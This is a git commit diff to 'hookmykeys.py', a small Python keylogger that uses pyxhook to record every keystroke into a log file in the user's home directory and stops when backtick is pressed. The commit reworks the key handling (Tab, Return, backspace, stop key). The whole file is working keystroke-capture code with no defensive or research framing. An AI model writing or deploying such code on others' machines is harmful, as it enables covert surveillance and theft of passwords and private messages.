d2dac3142deaef6024cc9fa9f97ab43109e51af2
Gaurav Arora <38912972+gpasys@users.noreply.github.com>
2019-08-08 18:00:01 +0530

    Update hookmykeys.py

--- hookmykeys.py
+++ hookmykeys.py
@@ -3,24 +3,24 @@ import os.path
 homedir = os.path.expanduser('~')
 log_file=homedir+'/HookMyKeys/HookMyKeys.log' #this is the path of log file
 
-def OnKeyPress(event):
+def KeyPress(event):
   logfile=open(log_file,'a')
-  if event.Ascii==32:
+  if event.Ascii==32 or event.Key=='Tab':
   	logfile.write(' ')
-  elif event.Key=='Return' or event.Key=='Tab':
-	logfile.write(' ')
+  elif event.Key=='Return':
+	logfile.write('\n')
 	
   elif event.Key=='BackSpace':
 	size=logfile.tell()
 	logfile.truncate(size-1)
+  elif event.Ascii==96:
+	logfile.write('\n')
+	logfile.close()
+    	hooked.cancel()
   else:
 	logfile.write(event.Key)
 
-  if event.Ascii==96:
-	logfile.close()
-    	new_hook.cancel()
-
-new_hook=pyxhook.HookManager()
-new_hook.KeyDown=OnKeyPress
-new_hook.HookKeyboard()
-new_hook.start()
+hooked=pyxhook.HookManager()
+hooked.KeyDown=KeyPress
+hooked.HookKeyboard()
+hooked.start()
